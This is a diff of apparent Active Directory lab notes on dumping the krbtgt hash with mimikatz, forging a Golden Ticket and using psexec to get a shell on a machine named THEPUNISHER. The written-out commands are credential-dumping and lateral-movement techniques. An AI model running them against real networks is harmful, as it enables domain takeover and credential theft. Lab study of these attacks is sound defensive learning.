@@ -98,10 +98,10 @@ ignore PC passwords, they are typically not going to be cracked and have low val
 4. This allows us to generate tickets if we have the hash of the krbtgt account
 5. With the hash of the krbtgt account we can use it to access service and resource or create a 'Golden Ticket' and use that for access.
 
-**From the DC, run as admin on cmd.exe and the following:**  
-    mimikatz.exe
-    privilige::debug
-    lsadump::lsa /inject /name:krbtgt
+**From the DC, run cmd.exe as admin and the following:**  
+    mimikatz.exe  
+    privilige::debug  
+    lsadump::lsa /inject /name:krbtgt  
 
 ![image](https://github.com/user-attachments/assets/7baacf00-be56-46aa-ba61-88670fbc1574)
 
@@ -127,7 +127,7 @@ pull up cmd with the newly created Golden Ticket session.
 
 ![image](https://github.com/user-attachments/assets/76543f30-69a5-4391-8f87-4b2ea17357d1)
 
-We have gained access into THEPUNISHER machine. For further compromise of this user, we could install psexec.exe orr other a sysinternals tool on our attacker machine for remote code execution. Once downloaded, from the terminal we can use 'psexec.exe \\THEPUNISHER cmd.exe' to gain a reverse shell and functional interaction.  
+We have gained access into THEPUNISHER machine. For further compromise of this user, we could install psexec.exe orr other a sysinternals tool on our attacker machine for remote code execution. Once downloaded, from the Golden Ticket, misc::cmd terminal we can use 'psexec.exe \\THEPUNISHER cmd.exe' to gain a reverse shell and functional interaction.  
 
 ---
 
